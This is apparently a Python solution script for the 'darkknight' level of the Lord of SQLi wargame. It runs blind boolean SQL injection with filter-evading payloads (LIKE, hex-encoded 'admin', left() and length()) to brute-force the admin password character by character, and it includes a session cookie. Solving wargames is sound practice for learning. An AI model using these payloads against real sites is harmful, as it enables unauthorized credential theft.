import requests
import string
BASE_URL = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'

HEADERS = {'Cookie': 'PHPSESSID=jjtmaq38q5rbmsvrmk9unjvk53'}

def solve(pw):
    url = BASE_URL + pw
    # print(url)
    data = requests.get(url, headers=HEADERS).text
    if 'Hello admin' in data:
        return True
    return False


def brute_len_pw():
    for i in range(20):
        payload = f"?pw=1&no=1 || id LIKE 0x61646D696E %26%26 length(pw) LIKE {i} "
        if solve(payload):
            # len: 8
            print(f"[+] Find length pw: {i}")
            break
        else:
            print(f'[-] Failed {i}')

# brute_len_pw()

character_allowed = string.printable
def brute_pw():
    password = ""
    for i in range(1,9):
        for c in character_allowed:
            temp = c
            c  = password + c
            # brute từng kí tự giá trị password của username admin , sử dụng hàm left(string, bao nhieu chu)
            payload = f'?pw=1&no=1 || id LIKE 0x61646D696E %26%26 hex(left(pw,{i})) like hex("{c}")-- -'
            if solve(payload):
                password += temp
                print(f'[+] Found pass: ' + password)
                break
            else:
                print(f'Failed {i} {c}')
                pass
brute_pw()
